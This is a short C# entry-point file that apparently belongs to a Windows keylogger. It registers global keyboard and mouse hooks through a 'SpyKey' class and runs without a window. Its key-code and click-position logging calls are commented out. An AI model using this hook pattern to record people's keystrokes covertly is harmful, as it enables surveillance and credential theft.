using System;
using System.Windows.Forms;

namespace Classes
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            SpyKey.OnKeyDownEvent += OnKeyDownEvent;
            SpyKey.OnKeyUpEvent += OnKeyUpEvent;
            SpyKey.OnMouseLBtnDownEvent += OnMouseLBtnDownEvent;
            SpyKey.OnMouseRBtnDownEvent += OnMouseRBtnDownEvent;
            SpyKey.Start();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run();
        }

        private static void OnMouseRBtnDownEvent(object sender, SpyKey.MouseEventArgs e)
        {
            //Keylogger.Trace("Mouse RButton Down: X" + e.LowLevelMsInfo.pt.X);
            //Keylogger.Trace("Mouse RButton Down: Y" + e.LowLevelMsInfo.pt.Y);
        }

        private static void OnMouseLBtnDownEvent(object sender, SpyKey.MouseEventArgs e)
        {
            //Keylogger.Trace("Mouse LButton Down: X" + e.LowLevelMsInfo.pt.X);
            //Keylogger.Trace("Mouse LButton Down: Y" + e.LowLevelMsInfo.pt.Y);
        }

        private static void OnKeyDownEvent(object sender, SpyKey.KeyboardEventArgs e)
        {
            //Keylogger.Trace("KeyDown: " + e.LowLevelKbInfo.vkCode.ToString());
        }
        private static void OnKeyUpEvent(object sender, SpyKey.KeyboardEventArgs e)
        {
            //Keylogger.Trace("KeyUp: " + e.LowLevelKbInfo.vkCode.ToString());
        }
    }
    
}
